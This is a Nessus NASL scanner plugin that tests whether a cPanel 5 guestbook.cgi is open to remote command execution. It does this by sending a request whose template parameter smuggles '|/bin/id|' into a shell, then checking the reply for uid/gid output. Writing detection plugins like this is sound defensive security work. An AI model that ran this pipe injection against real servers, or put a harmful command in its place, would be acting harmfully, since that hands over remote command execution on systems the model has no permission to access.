# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# *untested*
#
# Message-ID: <3E530C7A.9020608@scan-associates.net>
# From: pokleyzz <pokleyzz@scan-associates.net>
# To: bugtraq@securityfocus.org
# Subject: Cpanel 5 and below remote command execution and local root
#           vulnerabilities
#
# 


 desc = "
cpanel is installed and does not properly filter user input.
A cracker may use this flaw to execute any command on your system.

Solution : Upgrade to cpanel 6.0
Risk factor : High";



if(description)
{
 script_id(11281);
 script_bugtraq_id(6882);
 script_version ("$Revision: 1.6 $");
 
 name["english"] = "cpanel remote command execution";
 script_name(english:name["english"]);
 

 script_description(english:desc);
 
 summary["english"] = "Executes /bin/id";
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

cmd[0] = "/usr/bin/id";
cmd[1] = "/bin/id";

port = get_http_port(default:80);
if ( ! port ) exit(0);

for (i=0; i<2; i++)
{
http_check_remote_code (
			unique_dir:"/cgi-sys",
			check_request:"/guestbook.cgi?user=cpanel&template=|" + cmd[i] + "|",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
			description:desc,
			port:port
			);
}
